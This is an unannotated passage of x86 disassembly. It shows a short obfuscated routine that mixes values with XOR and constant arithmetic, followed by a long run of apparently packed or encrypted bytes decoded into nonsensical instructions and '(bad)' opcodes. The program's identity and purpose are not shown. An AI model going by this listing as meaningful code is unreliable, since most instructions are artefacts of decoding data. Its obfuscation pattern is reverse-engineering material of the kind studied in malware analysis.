  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	or     bl,BYTE PTR [edi+0x467da5d1]
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	rol    al,1
  41425a:	outs   dx,BYTE PTR ds:[esi]
  41425b:	mov    dh,0x3f
  41425d:	leave  
  41425e:	imul   ebx
  414260:	xor    BYTE PTR [esi],0x9c
  414263:	stos   BYTE PTR es:[edi],al
  414264:	call   0x929aab23
  414269:	jg     0x414252
  41426b:	test   DWORD PTR [edx+0x59d5dad9],eax
  414271:	dec    esi
  414272:	inc    ebx
  414273:	xchg   edi,eax
  414274:	(bad)  
  414275:	ffreep st(1)
  414277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414278:	out    dx,eax
  414279:	push   edx
  41427a:	in     al,0xe0
  41427c:	pop    es
  41427d:	hlt    
  41427e:	pop    esp
  41427f:	pusha  
  414280:	adc    ah,BYTE PTR [eax]
  414282:	mov    edi,0x6b592383
  414287:	call   0xfffc:0x9b08735a
  41428e:	mov    edx,0x1a0edde9
  414293:	fsubr  st,st(0)
  414295:	inc    DWORD PTR [edi]
  414297:	lods   eax,DWORD PTR ds:[esi]
  414298:	repz fsubr st(2),st
  41429b:	push   esp
  41429c:	rol    BYTE PTR [edx+0x1c],0x5d
  4142a0:	ret    0x9265
  4142a3:	mov    dh,0x41
  4142a5:	ins    DWORD PTR es:[edi],dx
  4142a6:	pop    es
  4142a7:	and    ch,BYTE PTR [ebp-0x5f]
  4142aa:	call   0x2f179ff
  4142af:	add    BYTE PTR [ebx+eax*2+0x1a8d917f],al
  4142b6:	cwde   
  4142b7:	dec    ebx
  4142b8:	das    
  4142b9:	mov    esi,0xba481cd8
  4142be:	popf   
  4142bf:	sahf   
  4142c0:	shl    DWORD PTR [edi],1
  4142c2:	mov    BYTE PTR [ecx],dl
  4142c4:	fbstp  TBYTE PTR [ecx]
  4142c6:	push   es
  4142c7:	fwait
  4142c8:	pusha  
  4142c9:	xor    al,0x7c
  4142cb:	or     BYTE PTR [edx+edx*4],dh
  4142ce:	or     DWORD PTR [ebp-0x4],eax
  4142d1:	mov    ecx,0xec74f149
  4142d6:	outs   dx,DWORD PTR ds:[esi]
  4142d7:	int3   
  4142d8:	jp     0x41427c
  4142da:	inc    eax
  4142db:	rcr    DWORD PTR [edx-0x7238057c],cl
  4142e1:	iret   
  4142e2:	pop    eax
  4142e3:	dec    edi
  4142e4:	stc    
  4142e5:	push   ebx
  4142e6:	jl     0x4142d4
  4142e8:	push   ebp
  4142e9:	sbb    al,0x4c
  4142eb:	das    
  4142ec:	sub    BYTE PTR [esi],ah
  4142ee:	pop    esi
  4142ef:	in     eax,dx
  4142f0:	push   0xfffffff9
  4142f2:	push   ss
  4142f3:	sbb    eax,0x8cbcfc8e
  4142f8:	in     eax,dx
  4142f9:	pop    esp
  4142fa:	jmp    0x4142af
  4142fc:	xchg   ecx,eax
  4142fd:	jp     0x4142be
  4142ff:	mov    ah,BYTE PTR [edx+ebp*4-0x16]
  414303:	xchg   ecx,eax
  414304:	(bad)  
  414305:	(bad)  
  414306:	fiadd  WORD PTR [esi]
  414308:	ds retf 0x7b36
  41430c:	stos   DWORD PTR es:[edi],eax
  41430d:	xlat   BYTE PTR ds:[ebx]
  41430e:	daa    
  41430f:	mov    eax,ds:0xba62e645
  414314:	int3   
  414315:	rcr    DWORD PTR [esi],cl
  414317:	mov    edi,0xadd7edf6
  41431c:	ins    BYTE PTR es:[edi],dx
  41431d:	mov    cl,0x18
  41431f:	sub    eax,0xa3282ce1
  414324:	call   0x9fcb563f
  414329:	ins    BYTE PTR es:[edi],dx
  41432a:	inc    eax
  41432b:	cmp    DWORD PTR gs:[ebx],0x3bb5651d
  414332:	rcr    DWORD PTR [ebp+0x3e],0xf9
  414336:	(bad)  
  414337:	dec    eax
  414338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41433a:	cdq    
  41433b:	push   0x3a
  41433d:	mov    fs,WORD PTR [edi+0x52f0764d]
  414343:	push   edx
  414344:	test   BYTE PTR [esi+0x405269a6],dl
  41434a:	pop    ecx
  41434b:	aaa    
  41434c:	mov    fs,ecx
  41434e:	mov    WORD PTR [ebx-0xe],ss
  414351:	ds jbe 0x41439f
  414354:	icebp  
  414355:	jmp    0x7bda2f38
  41435a:	mov    esp,0xaea5980
  41435f:	call   0xf457e080
  414364:	arpl   bx,di
  414366:	sar    dl,0x3d
  414369:	mov    esi,0x93212b84
  41436e:	xor    ch,BYTE PTR [esi+ebp*4-0x21]
  414372:	sub    dh,BYTE PTR [ecx+0x368305ba]
  414378:	pop    eax
  414379:	lods   al,BYTE PTR ds:[esi]
  41437a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41437b:	call   0x3079:0xeba6bd1d
  414382:	inc    ebp
  414383:	adc    eax,0x9ba01b57
  414388:	mov    esi,0x8a2b945
  41438d:	out    0x3a,al
  41438f:	not    BYTE PTR [eax]
  414391:	arpl   WORD PTR [ecx-0x2630f35d],sp
  414397:	loope  0x4143a0
  414399:	mov    ?,ebp
  41439b:	jge    0x414406
  41439d:	inc    esi
  41439e:	jge    0x41437a
  4143a0:	pusha  
  4143a1:	dec    ecx
  4143a2:	pop    es
  4143a3:	cs retf 
  4143a5:	sbb    edi,DWORD PTR [ebx-0x1e]
  4143a8:	jno    0x41438f
  4143aa:	gs mov ah,0x3a
  4143ad:	jbe    0x4143db
  4143af:	test   BYTE PTR [edi-0x70d0b6df],bh
  4143b5:	sar    DWORD PTR [ecx],cl
  4143b7:	xor    eax,0xea5d8b11
  4143bc:	adc    eax,0xfdcec786
  4143c1:	or     DWORD PTR [esi-0xe],0xffffff9b
  4143c5:	lahf   
  4143c6:	in     al,0x83
  4143c8:	jbe    0x414369
  4143ca:	add    edx,DWORD PTR [esi-0x23]
  4143cd:	fidivr WORD PTR [edx]
  4143cf:	mov    edx,0x8414d39b
  4143d4:	mov    ebx,0x5caf78e9
  4143d9:	cld    
  4143da:	adc    BYTE PTR [ecx+0x5c],cl
  4143dd:	push   ecx
  4143de:	lahf   
  4143df:	mov    dh,0x90
  4143e1:	enter  0x679e,0x17
  4143e5:	cwde   
  4143e6:	int    0xbb
  4143e8:	in     eax,0xe2
  4143ea:	mov    ecx,0xbc15d77d
  4143ef:	jge    0x414439
  4143f1:	push   ecx
  4143f2:	xchg   ebp,eax
  4143f3:	icebp  
  4143f4:	fisub  DWORD PTR [esi+0x1289f8f2]
  4143fa:	frstor [eax]
  4143fc:	add    DWORD PTR [edi+0x252698be],0xffffffc8
  414403:	inc    edi
  414404:	outs   dx,DWORD PTR ds:[esi]
  414405:	repz arpl WORD PTR [ebp-0x5e3782a3],bp
  41440c:	jge    0x414483
  41440e:	not    ah
  414410:	pop    ebp
  414411:	pop    edx
  414412:	ds add ebx,edi
  414415:	fcom   DWORD PTR [edi-0x346fb33e]
  41441b:	out    dx,al
  41441c:	gs inc esp
  41441e:	mov    eax,0x54161c6c
  414423:	ins    DWORD PTR es:[edi],dx
  414424:	lock mov dh,0xbc
  414427:	xlat   BYTE PTR ds:[ebx]
  414428:	jp     0x414471
  41442a:	iret   
  41442b:	add    eax,0xcf594cca
  414430:	lods   eax,DWORD PTR ds:[esi]
  414431:	imul   ebp,DWORD PTR [ebp+0x6e],0x59d4256a
  414438:	mov    bl,0xb5
  41443a:	sub    BYTE PTR [eax],bl
  41443c:	test   cl,0xc
  41443f:	xor    BYTE PTR [ebx+esi*2-0x79cc5d79],dl
  414446:	jecxz  0x41441a
  414448:	retf   0xe74a
  41444b:	aaa    
  41444c:	stos   DWORD PTR es:[edi],eax
  41444d:	adc    dl,BYTE PTR ds:0x6dfea920
  414453:	push   ds
  414454:	adc    eax,0x24ba28a5
  414459:	xor    edx,edi
  41445b:	pop    esi
  41445c:	push   esi
  41445d:	jae    0x414445
  41445f:	rcl    ch,0x65
  414462:	(bad)  
  414463:	(bad)  
  414464:	pop    ds
  414465:	cdq    
  414466:	mov    ch,0xb7
  414468:	sub    BYTE PTR [edx],cl
  41446a:	scas   al,BYTE PTR es:[edi]
  41446b:	jb     0x4144d4
  41446d:	jns    0x414452
  41446f:	push   ss
  414470:	mov    ah,0xf
  414472:	push   esp
  414473:	dec    edx
  414474:	push   edi
  414475:	stos   BYTE PTR es:[edi],al
  414476:	xchg   edx,eax
  414477:	data16 data16 jne 0x41440d
  41447b:	adc    DWORD PTR [edi+0x7c441bbb],esi
  414481:	ins    BYTE PTR es:[edi],dx
  414482:	shl    BYTE PTR [ebp+0x1d],1
  414485:	mov    ?,WORD PTR ds:[ecx]
  414488:	sub    eax,0x505d645a
  41448d:	mov    dh,0x33
  41448f:	xor    ebp,DWORD PTR [eax]
  414491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414492:	in     eax,0x61
  414494:	mov    ah,0x9a
  414496:	jne    0x41447a
  414498:	and    BYTE PTR ds:[eax],ah
  41449b:	in     eax,dx
  41449c:	ficomp WORD PTR [edx+edx*8-0x58]
  4144a0:	jo     0x4144e6
  4144a2:	cmp    al,BYTE PTR [eax]
  4144a4:	in     al,0x2
  4144a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144a7:	xchg   edi,eax
  4144a8:	sub    eax,ebp
  4144aa:	and    al,0x22
  4144ac:	ins    BYTE PTR es:[edi],dx
  4144ad:	dec    eax
  4144ae:	neg    BYTE PTR [edi+0x61]
  4144b1:	sub    BYTE PTR [edi+0x7cc5a327],ch
  4144b7:	test   dl,dl
  4144b9:	shl    BYTE PTR [esi],cl
  4144bb:	repnz sbb al,0xe9
  4144be:	shr    DWORD PTR [ebp-0xaece8b0],1
  4144c4:	cmp    ah,BYTE PTR cs:[esi-0x14ac076c]
  4144cb:	jne    0x4144dd
  4144cd:	ret    0x7296
  4144d0:	imul   ebx,DWORD PTR [eax],0x7b018a4
  4144d6:	std    
  4144d7:	pop    eax
  4144d8:	lea    ecx,[ebx+0x41]
  4144db:	cld    
  4144dc:	mov    esp,0x78157f14
  4144e1:	push   0x4a
  4144e3:	loope  0x414542
  4144e5:	jno    0x41446c
  4144e7:	popf   
  4144e8:	popf   
  4144e9:	out    dx,al
  4144ea:	dec    ecx
  4144eb:	xor    dh,bl
  4144ed:	ret    
  4144ee:	std    
  4144ef:	push   esp
  4144f0:	mov    dl,0x37
  4144f2:	inc    esp
  4144f3:	rcl    edx,cl
  4144f5:	jns    0x414483
  4144f7:	dec    ecx
  4144f8:	ins    BYTE PTR es:[edi],dx
  4144f9:	test   al,0xe8
  4144fb:	hlt    
  4144fc:	xlat   BYTE PTR ds:[ebx]
  4144fd:	xchg   esp,eax
  4144fe:	dec    ecx
  4144ff:	clc    
  414500:	sub    edi,DWORD PTR [ecx-0x4f]
  414503:	fcmovu st,st(1)
  414505:	clc    
  414506:	les    ebx,FWORD PTR [ebp+0x484501d5]
  41450c:	in     al,dx
  41450d:	rcl    BYTE PTR [edx],0x2a
  414510:	inc    edi
  414511:	cmp    BYTE PTR [edi-0x37],bl
  414514:	xchg   ebp,eax
  414515:	pop    edx
  414516:	sti    
  414517:	or     BYTE PTR [edi-0x10996c3a],dh
  41451d:	xor    BYTE PTR [esi],ah
  41451f:	mov    WORD PTR [edx-0x22],fs
  414522:	repz and al,0xba
  414525:	in     al,0x8a
  414527:	cmp    ecx,edx
  414529:	loope  0x41456d
  41452b:	(bad)  
  41452c:	ss cmc 
  41452e:	scas   al,BYTE PTR es:[edi]
  41452f:	push   ebx
  414530:	pop    esp
  414531:	sbb    dh,bl
  414533:	dec    ebp
  414534:	test   bl,bl
  414536:	(bad)  
  414537:	(bad)  
  414538:	xchg   ebp,eax
  414539:	lea    esp,[edi-0x3b]
  41453c:	xchg   esi,eax
  41453d:	frstor [edx+0x24e40a23]
  414543:	dec    eax
  414544:	sar    DWORD PTR [edi],cl
  414546:	cld    
  414547:	pop    ebx
  414548:	xor    BYTE PTR [ebx-0x412d505],bl
  41454e:	xchg   esi,eax
  41454f:	mov    esp,0x528b2dc
  414554:	ret    0xca86
  414557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414558:	in     eax,0x5b
  41455a:	mov    al,ds:0x9c80dc00
  41455f:	push   ecx
  414560:	cdq    
  414561:	test   eax,0xf85aad2f
  414566:	sar    DWORD PTR [edi+0x59],1
  414569:	push   edx
  41456a:	fsubr  QWORD PTR [edx+eiz*1-0x14d0a1f9]
  414571:	into   
  414572:	sbb    bl,BYTE PTR [ecx+0x43]
  414575:	test   al,0x3e
  414577:	xor    edi,DWORD PTR [esi]
  414579:	xchg   ecx,eax
  41457a:	imul   eax,esp,0x6e509398
  414580:	(bad)  [ebx-0x5b]
  414583:	call   0x9ca1:0x7a23
  414589:	xor    BYTE PTR [ebp-0x263ff879],bl
  41458f:	pop    ebp
  414590:	push   cs
  414591:	les    edx,FWORD PTR [edx+0x157e0797]
  414597:	repnz das 
  414599:	adc    cl,dh
  41459b:	fldenv [ebx+edi*2]
  41459e:	stos   BYTE PTR es:[edi],al
  41459f:	jl     0x4145dc
  4145a1:	inc    esp
  4145a2:	(bad)  
  4145a3:	push   ds
  4145a4:	gs xchg edx,eax
  4145a6:	test   eax,0x26cf4582
  4145ab:	js     0x4145a1
  4145ad:	sti    
  4145ae:	add    eax,0x56225b5b
  4145b3:	hlt    
  4145b4:	stos   DWORD PTR es:[edi],eax
  4145b5:	cmp    eax,0xea777721
  4145ba:	mov    ds:0x5dedbe29,eax
  4145bf:	in     eax,dx
  4145c0:	cdq    
  4145c1:	mov    eax,0xad863e46
  4145c6:	std    
  4145c7:	cmp    bl,BYTE PTR [ecx+eiz*8+0x26060f2b]
  4145ce:	mov    al,ds:0xa94b6a29
  4145d3:	loope  0x414626
  4145d5:	xchg   ebx,eax
  4145d6:	int    0x8
  4145d8:	xchg   edi,eax
  4145d9:	push   ecx
  4145da:	push   esi
  4145db:	out    dx,al
  4145dc:	outs   dx,BYTE PTR ds:[esi]
  4145dd:	mov    ebp,0x2cd7b33f
  4145e2:	mov    BYTE PTR [eax+0x2a401787],ch
  4145e8:	xchg   esp,eax
  4145e9:	dec    esp
  4145ea:	pusha  
  4145eb:	fiadd  WORD PTR [edx]
  4145ed:	retf   
  4145ee:	ins    BYTE PTR es:[edi],dx
  4145ef:	dec    edx
  4145f0:	and    eax,0xa89a1d8f
  4145f5:	lock pop ebx
  4145f7:	jnp    0x41462a
  4145f9:	mov    esi,?
  4145fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145fc:	icebp  
  4145fd:	xchg   ecx,eax
  4145fe:	(bad)  
  4145ff:	(bad)
  414603:	jo     0x414642
  414605:	dec    eax
  414606:	outs   dx,BYTE PTR ds:[esi]
  414607:	lods   eax,DWORD PTR ds:[esi]
  414608:	xlat   BYTE PTR ds:[ebx]
  414609:	jns    0x41459f
  41460b:	dec    ebx
  41460c:	loope  0x41465b
  41460e:	pop    ds
  41460f:	add    bh,BYTE PTR [esi]
  414611:	fiadd  DWORD PTR [edi-0x9e5f9e8]
  414617:	xchg   ecx,eax
  414618:	in     al,dx
  414619:	fist   WORD PTR ds:0xbce4fa69
  41461f:	mov    ds:0x36e365b8,eax
  414624:	inc    ecx
  414625:	sub    cl,0xf4
  414628:	hlt    
  414629:	mov    bl,0x35
  41462b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41462c:	fcmovnu st,st(0)
  41462e:	test   al,0x56
  414630:	out    dx,al
  414631:	repnz mov ds:0x5a42f32,eax
  414637:	sub    al,0xb1
  414639:	test   BYTE PTR [esi-0x520a6638],cl
  41463f:	ins    BYTE PTR es:[edi],dx
  414640:	pop    ds
  414641:	and    dl,dh
  414643:	shl    DWORD PTR [edx],cl
  414645:	pop    esp
  414646:	clc    
  414647:	in     eax,0x53
  414649:	xchg   esp,eax
  41464a:	sub    edx,DWORD PTR [bx+di+0x2b]
  41464e:	out    dx,eax
  41464f:	xchg   ebp,eax
  414650:	sahf   
  414651:	fbstp  TBYTE PTR [eax+0x6d]
  414654:	mov    BYTE PTR [ebx+0x75],bl
  414657:	ja     0x4145fc
  414659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41465a:	and    al,0xbb
  41465c:	dec    ebx
  41465d:	sub    ebp,eax
  41465f:	out    dx,eax
  414660:	test   DWORD PTR [edx],esp
  414662:	nop
  414663:	test   BYTE PTR [eax+0x23ae434d],0x92
  41466a:	and    dl,al
  41466c:	sub    DWORD PTR [ebp+0x7f],eax
  41466f:	dec    esi
  414670:	adc    BYTE PTR [edi+ecx*1-0x61],dl
  414674:	jmp    0xa0b1:0xa38c4545
  41467b:	push   ebx
  41467c:	das    
  41467d:	mov    esi,0xcf4052f0
  414682:	pop    esp
  414683:	sar    BYTE PTR [ecx],0x42
  414686:	retf   0xa9da
  414689:	(bad)  
  41468b:	add    cl,BYTE PTR [esi+ebp*8-0xd19e8e2]
  414692:	mov    eax,0xa6d69fad
  414697:	cs out 0x6c,al
  41469a:	les    esi,FWORD PTR [ecx+0x1dc13a9f]
  4146a0:	dec    eax
  4146a1:	stos   DWORD PTR es:[edi],eax
  4146a2:	cmp    ecx,DWORD PTR [ecx+esi*8]
  4146a5:	outs   dx,BYTE PTR ds:[esi]
  4146a6:	sahf   
  4146a7:	(bad)  
  4146a8:	faddp  st(4),st
  4146aa:	inc    esp
  4146ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146ac:	xor    al,0xb9
  4146ae:	or     BYTE PTR [eax-0x1b],bl
  4146b1:	jl     0x4146ca
  4146b3:	call   FWORD PTR [edi+0x2af913e0]
  4146b9:	xor    eax,edx
  4146bb:	(bad)  
  4146bc:	(bad)  [edi]
  4146be:	push   es
  4146bf:	dec    BYTE PTR [edx-0x1be3510b]
  4146c5:	(bad)  
  4146c6:	int    0xb2
  4146c8:	(bad)  
  4146c9:	push   edi
  4146ca:	sbb    DWORD PTR [eax],esi
  4146cc:	pop    ebx
  4146cd:	mov    eax,ds:0x68ce119e
  4146d2:	das    
  4146d3:	xor    eax,0x3a023016
  4146d8:	jl     0x4146fd
  4146da:	jl     0x41467e
  4146dc:	inc    edi
  4146dd:	dec    esp
  4146de:	jnp    0x4146f0
  4146e0:	cmp    bl,BYTE PTR [eax-0x4c]
  4146e3:	in     al,dx
  4146e4:	jmp    0xd8cc:0x51b29786
  4146eb:	daa    
  4146ec:	xchg   DWORD PTR [ebx+eiz*2-0x1d],edi
  4146f0:	sbb    DWORD PTR [ebp-0x71d141],ecx
  4146f6:	clc    
  4146f7:	pop    ss
  4146f8:	mov    dh,0xac
  4146fa:	ret    0x659c
  4146fd:	aas    
  4146fe:	ret    
  4146ff:	popf   
  414700:	fimul  DWORD PTR [ebx+ecx*8]
  414703:	push   esp
  414704:	xchg   ebx,eax
  414705:	js     0x414705
  414707:	loopne 0x414758
  414709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41470a:	lea    esi,[eax]
  41470c:	jmp    0x24263df1
  414711:	add    al,BYTE PTR [edi]
  414713:	sti    
  414714:	inc    ebp
  414715:	or     eax,DWORD PTR es:[ecx+0x368d0beb]
  41471c:	mov    dh,0x3a
  41471e:	add    eax,0x638b51f8
  414723:	movaps XMMWORD PTR [ebp+0x437dc122],xmm4
  41472a:	xor    DWORD PTR [esp+eax*1-0x6b],eax
  41472e:	jge    0x41472b
  414730:	add    al,0xb8
  414732:	xor    BYTE PTR [ecx-0x57d01131],0xce
  414739:	inc    ebx
  41473a:	mov    al,0x72
  41473c:	inc    edi
  41473d:	jl     0x41477c
  41473f:	cld    
  414740:	sbb    esp,DWORD PTR [ecx-0x58]
  414743:	bound  ecx,QWORD PTR [eax-0x69]
  414746:	xchg   esi,edx
  414748:	adc    edx,ebp
  41474a:	cmp    esi,ecx
  41474c:	cmc    
  41474d:	mov    ebx,0xca7e452e
  414752:	ret    0xf385
  414755:	(bad)  
  414756:	xor    dh,BYTE PTR [edx+0x32]
  414759:	lea    esi,[ebp-0x3e7e9f02]
  41475f:	popf   
  414760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414761:	cmp    esp,edx
  414763:	pop    ebx
  414764:	xor    eax,0x35d2257d
  414769:	pusha  
  41476a:	mov    ds:0xf609d460,eax
  41476f:	add    eax,0x9c376dc9
  414774:	xchg   DWORD PTR [esi],ecx
  414776:	jae    0x41477f
  414778:	in     al,0xae
  41477a:	and    al,0x27
  41477c:	aaa    
  41477d:	je     0x4147f2
  41477f:	and    esi,edx
  414781:	jnp    0x414782
  414783:	sub    BYTE PTR [ecx+0x1a1f5c10],dl
  414789:	imul   edx,DWORD PTR [eax-0x6b9ad16d],0xffffffcb
  414790:	add    al,0xba
  414792:	rcr    esp,1
  414794:	std    
  414795:	mov    bl,0x7
  414797:	(bad)  
  414798:	mov    ds:0xf29cbf99,al
  41479d:	in     al,dx
  41479e:	adc    edi,DWORD PTR [esi-0x1c407db4]
  4147a4:	jp     0x414791
  4147a6:	cli    
  4147a7:	inc    edi
  4147a8:	cld    
  4147a9:	push   ds
  4147aa:	push   esp
  4147ab:	stos   DWORD PTR es:[edi],eax
  4147ac:	test   esi,ebp
  4147ae:	mov    bh,0x82
  4147b0:	loop   0x414775
  4147b2:	mov    eax,ds:0x2397d432
  4147b7:	cmp    BYTE PTR [ebx-0x612aadd],cl
  4147bd:	pop    esp
  4147be:	mov    ah,0x4c
  4147c0:	clc    
  4147c1:	aaa    
  4147c2:	xchg   ebp,eax
  4147c3:	lock mov cs,edx
  4147c6:	jne    0x4147bc
  4147c8:	inc    ecx
  4147c9:	adc    eax,esp
  4147cb:	adc    dh,0xfd
  4147ce:	call   0x20cd0616
  4147d3:	pusha  
  4147d4:	inc    ebp
  4147d5:	scas   al,BYTE PTR es:[edi]
  4147d6:	push   esi
  4147d7:	sbb    eax,0x942756d3
  4147dc:	rcr    bh,1
  4147de:	gs dec ecx
  4147e0:	jb     0x4147e5
  4147e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147e3:	mov    al,0x88
  4147e5:	push   ecx
  4147e6:	(bad)  
  4147e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147e8:	or     BYTE PTR [esp+ecx*8-0x10fc1ce6],al
  4147ef:	cmp    dh,cl
  4147f1:	sub    al,0x92
  4147f3:	sub    esp,DWORD PTR [ebp-0x2b4bb2fc]
  4147f9:	js     0x4147a2
  4147fb:	and    ch,ch
  4147fd:	sbb    ecx,DWORD PTR [ecx-0x641c5871]
  414803:	retf   0x947b
  414806:	data16 in al,dx
  414808:	stos   BYTE PTR es:[edi],al
  414809:	jmp    0xaa5f:0xb4c70a6a
  414810:	adc    edi,DWORD PTR [ebx+0x15]
  414813:	inc    ebp
  414814:	pop    eax
  414815:	sub    DWORD PTR [eax-0x3a],eax
  414818:	pop    esi
  414819:	int3   
  41481a:	int3   
  41481b:	xlat   BYTE PTR ss:[ebx]
  41481d:	cmp    BYTE PTR [edi+0x36],ah
  414820:	std    
  414821:	pop    eax
  414822:	xor    ah,BYTE PTR [esi-0x60]
  414825:	and    bl,BYTE PTR [eax-0x29e296a9]
  41482b:	ds clc 
  41482d:	popf   
  41482e:	(bad)  
  41482f:	xchg   eax,edi
  414831:	mov    DWORD PTR [esi+esi*8-0x48],edi
  414835:	sbb    ebp,DWORD PTR [edi+0x281685cd]
  41483b:	push   eax
  41483c:	sar    BYTE PTR [ebx],1
  41483e:	das    
  41483f:	or     dh,dl
  414841:	and    dl,BYTE PTR [esi+edx*8]
  414844:	jle    0x4148b1
  414846:	jmp    0x414890
  414848:	sub    al,ah
  41484a:	(bad)  
  41484c:	pop    eax
  41484d:	les    edx,FWORD PTR [ebx]
  41484f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414850:	cmc    
  414851:	or     ah,BYTE PTR cs:[ebp+0x4626b0a4]
  414858:	pop    ds
  414859:	leave  
  41485a:	sbb    al,0xb
  41485c:	mov    DWORD PTR [esi+0x693f0d33],esi
  414862:	pushf  
  414863:	aad    0xc2
  414865:	pop    ss
  414866:	(bad)  [ecx]
  414868:	xlat   BYTE PTR ds:[ebx]
  414869:	mov    ds:0x476e5e71,eax
  41486e:	xor    ch,bh
  414870:	out    dx,al
  414871:	bound  ecx,QWORD PTR [edx-0x1578627f]
  414877:	xor    al,0xac
  414879:	pop    ss
  41487a:	or     al,0xaa
  41487c:	scas   eax,DWORD PTR es:[edi]
  41487d:	pop    ds
  41487e:	add    eax,0xe2efb2ed
  414883:	loopne 0x4148f2
  414885:	mov    edi,0x9a72c8d3
  41488a:	pop    ds
  41488b:	dec    ebp
  41488c:	pop    edi
  41488d:	in     eax,dx
  41488e:	or     DWORD PTR [eax+eax*2],esi
  414891:	mov    cl,ah
  414893:	push   0xd6150a62
  414898:	fisttp WORD PTR [edx+ecx*1-0xa]
  41489c:	(bad)
  41489f:	xor    al,0xc
  4148a1:	ss cld 
  4148a3:	cld    
  4148a4:	xlat   BYTE PTR ds:[ebx]
  4148a5:	adc    al,0x40
  4148a7:	imul   ebx,DWORD PTR [ebp-0x7453baeb],0x287fe7e0
  4148b1:	cmc    
  4148b2:	jbe    0x41485b
  4148b4:	jp     0x414912
  4148b6:	retf   
  4148b7:	mov    cl,0x8d
  4148b9:	dec    ebp
  4148ba:	popa   
  4148bb:	fs inc esi
  4148bd:	push   ebp
  4148be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148bf:	push   ecx
  4148c0:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4148c2:	aas    
  4148c3:	or     esp,DWORD PTR [eax]
  4148c5:	clc    
  4148c6:	mov    ecx,0x8fd2a2cf
  4148cb:	dec    ebp
  4148cc:	and    DWORD PTR [ecx],esi
  4148ce:	or     bh,BYTE PTR [edi]
  4148d0:	int3   
  4148d1:	lods   al,BYTE PTR ds:[esi]
  4148d2:	std    
  4148d3:	dec    edi
  4148d4:	clc    
  4148d5:	jp     0x414864
  4148d7:	mov    al,ds:0xc553398f
  4148dc:	add    ah,0xab
  4148df:	iret   
